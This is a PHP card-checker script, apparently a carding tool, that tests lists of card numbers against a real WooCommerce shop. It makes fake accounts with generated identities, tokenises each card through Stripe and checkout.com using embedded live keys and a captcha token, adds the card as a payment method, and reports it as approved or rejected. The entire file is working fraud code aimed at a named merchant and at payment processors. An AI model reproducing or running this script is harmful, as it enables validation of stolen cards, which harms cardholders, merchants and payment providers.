<?php

// Api By Haika <3

error_reporting(0);

$get = $_GET['lista'];
$explode = explode("|", $get);
[$cc, $mes, $ano, $cvv] = $explode;

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function GenerateUsers(){
    $rand = rand(10, 10000000000);
    $names = ['haika', 'kelly', 'jessica', 'lucas', 'joao', 'maria', 'pedro', 'ana', 'carlos', 'julia', 'fernanda', 'gabriel', 'isabela', 'henrique', 'lara', 'matheus', 'natalia', 'olivia', 'pedro', 'queiroz', 'rebecca', 'samuel', 'thais', 'vinicius', 'yasmin', 'zoe'];
    $sub_names = ['silva', 'franco', 'santos', 'oliveira', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira'];
    $name = $names[rand(0, count($names) - 1)];
    $sub_name = $sub_names[rand(0, count($sub_names) - 1)];
    $name_full = "$name$sub_name";
    $email = $name.$rand.'@gmail.com';

    return [
        'email' => $email,
        'name_full' => $name_full,
        'name' => $name,
        'sub_name' => $sub_name
    ];
}

if(empty($cc) || empty($mes) || empty($ano) || empty($cvv)){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
} if (strlen($cc) != 16 || strlen($mes) != 2 || strlen($ano) != 4 || strlen($cvv) != 3){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
} if (!is_numeric($cc) || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
}

$users = GenerateUsers();
$cookiecount = "woo_".rand(10, 10000000000)."";

$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://api.checkout.com/tokens");
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: */*',
'authorization: pk_wf64cebluwwe46fsf7fgb3l5umk',
'content-type: application/json',
'origin: https://js.checkout.com',
'referer: https://js.checkout.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0'));
curl_setopt($c, CURLOPT_POSTFIELDS, '{"type":"card","number":"'.$cc.'","expiry_month":11,"expiry_year":2028,"cvv":"483","name":"haikarajadas Regina","billing_address":{"address_line1":"Haikara Izakaya","city":"Paris","state":"IDF","zip":"75011","country":"FR"},"phone":{"number":"5519996831732"},"preferred_scheme":"","requestSource":"JS"}');
$puxarbins = curl_exec($c);
$pais = getStr($puxarbins, '"issuer_country":"','",');
$bandeira = getStr($puxarbins, '"scheme":"','",');
$tipo = getStr($puxarbins, '"card_type":"','",');
$nivel = getStr($puxarbins, '"product_type":"','"');
$banco = getStr($puxarbins, '"issuer":"','",');
$INFO = "$bandeira $banco $tipo $nivel ($pais)";
$informacoes = strtolower($INFO);

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://smoothitalia.com/my-account/');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
$account = curl_exec($c);
$reg = getStr($account, 'name="woocommerce-register-nonce" value="','"');

$email = $users['email'];
$nome = $users['name_full'];

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://smoothitalia.com/my-account/');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://smoothitalia.com',
'referer: https://smoothitalia.com/my-account/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
));
curl_setopt($c, CURLOPT_POSTFIELDS, 'username='.$nome.'&email='.urlencode($email).'&password=Craft32%40%23%23%40%24&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fsmoothitalia.com%2Fcategoria-prodotto%2Fcarhartt-wip-shop-online%2Fpage%2F33%2F&wc_order_attribution_session_start_time=2025-01-13+22%3A16%3A19&wc_order_attribution_session_pages=14&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F131.0.0.0+Safari%2F537.36+Edg%2F131.0.0.0&woocommerce-register-nonce='.$reg.'&_wp_http_referer=%2Fmy-account%2F&register=Register');
$CreateAccount = curl_exec($c);

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
));
curl_setopt($c, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.substr($ano, -2).'&guid=d8e0416f-c5b1-4142-8602-3ab095246fe1edef4c&muid=f6fefe3a-8fda-4dca-889a-a5d98aabeff6a31930&sid=83395d7e-80c9-4f4b-8dd5-40bbfca0692d901b3a&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2Fa8d5dc1378%3B+stripe-js-v3%2Fa8d5dc1378%3B+split-card-element&referrer=https%3A%2F%2Fsmoothitalia.com&time_on_page=24592&key=pk_live_hRjaP3LPE1e1nmsxhD6h5nTD&_stripe_version=2022-08-01&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiMk4xWWYwS1ZPVm9tUlRCaytGOVF0S2xuSUZmcWVlcUFFYXpVMHZRbHZpVnhUalhlOGtyK0wrNkwzdG4xRXZKdGtnc3AwQ3VFNG8xRTViMWVVUFIzK0g3YWlJSWlHVVpQL2FSWHNuVjJuTm8zaE13dFZ2R1hNNEUraHlEOGFLS2ttR2RZb0NaTWJ5RWRBbENIbnFnSXJ0eTlTRmNoWS9wV0M2dTNsZjBZdUlMWjdnenJDU2M2c0NlQXoyb2ZDWE9xclNudStyVWFTOXgwMDJFQnZqaG9NRjZSRWRXOVpiSm1Ma1lzTG53a1hsUE04UjV1RVdUVzBIREg1WFNzeW04UW1rMUVKSE5GNU1meUJqaG1zR2RFaVkzVWlSTVV6TzJiZXczNnV4cnhFTU1sbFZ6ZE0vNmRqNUxpd0VJWkRoelFTbldvdklaVFRiSGRVb1MzdTVpQ0FqbkN1eGYvT0g1c2V3ZGlxbG1XWWF6UDZnVkdjejQ2bm9DRnc0WGgvbUlwWkN4b2xJUXRyYk1McTNqZUZYYmh3dDdWaDNUejZRWWtKeHF2cUk3MWxOc1JKeHd3TTFVVGZwb2twcFlFMFBxb1dHdzUzY2hCcnU5QUtqRkJLRm16OHVNelZQR3ZCWGNDWlZBTGUvTG5xYjQrYlljVTJ4ZUVlRlFuaUlvbExNbkNjdnpOZ05JMUd4c0h3M3AwRytLZWFWdDJXUGhqK0JhR09jZGhhMkdRalQ3czN4bUgzNDZya2FjWHVVQlZmazdPRnRhVmlzOERpOVNFM05MNHhNalE5SHlkcG40MDlUeEtvUEU2c3VwbU50S2lIRnJiQ01wVm9FYVA5dnRBQTVyb2haM04yS2s2ZGV1YmRsdmV6aVJVcHZpMGljS3J1dFNMb0tZNUFKTDFaRzlXYVFWNzYvaThWdGZLQzl0d2U3MVVjeThaRXFSeDYrQlMzZWI2UEN4MWJiMmJHWE9YRlU0RzdsUHdqNEZYV0F2aXM1bFFUOXdHMkg4NVF5MkFZdzNreXdWRnFEMXY2RWtmZ1F5empmcktPd3dIenhpTnNTQVE5YTBxNDlVVkdwa3ZuRnNKcVVqeEVtNThSdGJrck1tTW1Ob2puc0pEYzlabDlkUHB5Mmtmc09Ta1I4TDE5cklmam5vWWhxWStrZG5oby9VUVZ0UkRXa1JqL0NCZWdNdFhhaXFhcXJCcGZPVDBoZml3KzFMZXJnRk5mcWp1R01tcUlSUFlYem9WUXNFdk5TN3lUN08xZ0ZtZFZocU5TbWxKQjR1S3pQTXp3WlJJejRTNlFWZEJvU1NveGNTOU9neTVYZ2VOKzBKM3JiKy9TV3dXZWpCdVl3eXlHK1g5S3ZlUWQzY3JXcTczSGkxLzVBZnVocmNZNGlBdnNHUlNmNkRVYTBCcTB6SlBtVHJobmF3RmJIbHJpU0VFUjYwaktiMloyQURDdUJiZHNJRWRwRklFazc5dWRJMEY3VGlyZ0FGVXVsMkZBWGMzSlhqTGxObGh0L3JrSXJkdHBkT2p5R1RTNEcwbGRQcjduU0VCN0JveTc1TTlkaXM2T3Z5UmZmUUwrNkZPVU1FbmZDVkdEUGJDWkdVVThjd0pNWEV4UTVielhFTnJYRmM2aDJOelEvWmNTcFZkRjBOQjBnNnE2SW1mdUxQKzY1TmlrazRSR1dlNTlZRDRqL2VBcXROZ1dkcjA2Z2ZyMjhIRjViNEQxaXNEWm5SNm1NQU9Wc1IyR1pMd0N2K2lhZWg3QTFYeVlENWVYWGNzZXYzcEZWM1JmQW9YZ3dSWHBlaFlHaHZLRzhrenY3N1ZpbVZ2cEtOTGVNN0dZWHRZK2hUWFNwQ1B6bEFTVzZSZ3VYa1pRK1FnVHpERXhMRW9xMFMwZkFDcEUvenpJait1b1ZTaU9SRm54M0tvekpLS3UrODJXZFg3UmhvOVY2V2hIUTFjMitoRjR1elZFQU5sR21vcWEwZ3drZkVCcldMMkZYcFUyOEF3b0RuVkYzdWlyTGpzWm5EUi85UmdRWSsyTzdKYkFidTIybmQ4ek9hQXh4U29FTXc5dzVUTzVqUGs4dFlmelFGOVJtbDdpbE1DQUF1NHZFeDVIRnR6eXIyaUVCbW5VcnExSEYvMWVmc3hXOFkrVnpLenhhNThJWWJVbWZjTit2dlhPa1NWMERtYXAwcWFvUFBnQUZwVnVkQnNKUE5YbUNvcE1nZVl6M2p5VUtKMXpTL0tPQnhxbzJQT3dtaVd6NUJuMG5tR2kyUGNOQTMxZERDT1NtbnRNY3lBODluRHU3RUlkRk1Bb2RBRyszaE5FN3JJR1BRKytCNjd2L2NyVjA4M2F2QmZBNFcwQTU4dE5VOTlwWDZRaTRBdVNtRVl5bnBxN0pJbHNheGt0VDVROTJtb0ozRk9VVG1jVTRaRmY2dTdHVHBoU2lFWDUzQy93VkpUZkdPV2NyYU82TXdaUXRhY2Y4a3laVmh4ajhXNWFJaGVGZE96bEduUEFFa2xtTldPTllHazBZVWg1VnBlcDhPb2VMRXo4S1YzOXlJUGhLM2VnV2UrSVdPZHNwRHlWaXpxTy9SZW40eDRmV3FhaFp3dlZObjF0QnA5eHJLbE1vTEtwaE1zZkxsMWRVVzlaYWZhTHNQTi9UNStQcWkwb3JXY016b2loL0s2VHRjdDh5N1BTWlgrL2RGcWhqTE5ZYWNvL0VZcDQ1bmwxVitUNzBpNjE5eURXYXF6TEE4ZGxwRW51S3lGMUhUOWRwQk9mbG5nR1I4d1FHT291UzYwMDdGYThoRm9ZNmE3YUl6eE0wL0RiQituNFN0L1NyS1YwU0svUG5zTmxLcDdLZzVuUFhIMlg0L0NQdzhOd2FuMUJxRWdUS3I1OWxZOCIsImV4cCI6MTczNjgwODIyNCwic2hhcmRfaWQiOjcxNzcxNTM3LCJrciI6IjIwN2JlMWU1IiwicGQiOjAsImNkYXRhIjoiZmhPRUhGZE1kQ1M3ZDEvM2VTYUU2SW5PWlh3RHkwa3R5RXQyQ3gxL0pXeFJveEFPR05ENzA3dTFFTnQwUGs2SGd5UUlaNXBicmY0UnhqYU5kejBxYW43aXhqZ2pCMmxSWjg2dVFPbkhMY3p3Y0UwV2dsYUgyZnFXVHZnN2dYVTNUSkFyVzNWU2E0ekJST0l6RGhkcmNFRm91bjRZUVJjUFYyU1lCWmV4QTJPbWtuQ3BtSk5WZHBTL3E2YlNzVVdna3VKTGRVeVlTVXdpUFpERiJ9.1XAiAzHfMo-FHLNBljI_raxiq44doBVnAOB-JGKhWzI');
$stripe = curl_exec($c);

$json = json_decode($stripe, true);
$id = $json['id'];
$brand = $json['card']['brand'];

if(empty($id)){
    $message = $json['error']['message'];
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">['.$message.'] @Haika</span><br>';
    exit();
}

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://smoothitalia.com/my-account/add-payment-method/');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
$adx = curl_exec($c);
$nonceAd = getStr($adx, 'name="woocommerce-add-payment-method-nonce" value="','"');

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://smoothitalia.com/my-account/add-payment-method/');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://smoothitalia.com',
'referer: https://smoothitalia.com/my-account/add-payment-method/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
));
curl_setopt($c, CURLOPT_POSTFIELDS, 'payment_method=eh_stripe_pay&paypal_credit_card_rest-card-number=&paypal_credit_card_rest-card-expiry=&paypal_credit_card_rest-card-cvc=&woocommerce-add-payment-method-nonce='.$nonceAd.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1&eh_stripe_pay_token='.$id.'&eh_stripe_pay_currency=eur&eh_stripe_pay_amount=0&eh_stripe_card_type='.$brand.'');
$success = curl_exec($c);

if (stripos($success, 'Payment method successfully added.')){
  echo '<span class="badge badge-success">✅ # APROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-success">[Pagamento Aprovado!] @Haika </span><br>';
}else {
   $message = getStr($success, '<ul class="woocommerce-error" role="alert">','</li>');
   $message = str_replace('<li>', '', $message);
   
   if(empty($message)){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
   } else{
   echo '<span class="badge badge-danger">🧨 # REPROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">['.$message.'] @Haika</span><br>';
  }
}

if (file_exists(getcwd()."/$cookiecount.txt")){
    unlink(getcwd()."/$cookiecount.txt");
}

?>
